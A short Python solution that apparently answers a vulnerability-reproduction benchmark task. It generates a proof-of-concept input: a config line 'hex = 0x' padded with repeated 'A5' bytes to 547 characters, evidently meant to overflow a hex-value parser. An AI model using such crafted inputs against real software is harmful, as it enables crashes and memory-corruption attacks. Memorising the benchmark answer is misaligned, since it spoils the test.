import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        prefix = "hex = 0x"
        target_len = 547
        hex_len = target_len - len(prefix) - 1
        if hex_len < 2:
            hex_len = 2
        if hex_len % 2 != 0:
            hex_len -= 1
        hex_value = "A5" * (hex_len // 2)
        poc = f"{prefix}{hex_value}\n"
        return poc.encode("ascii")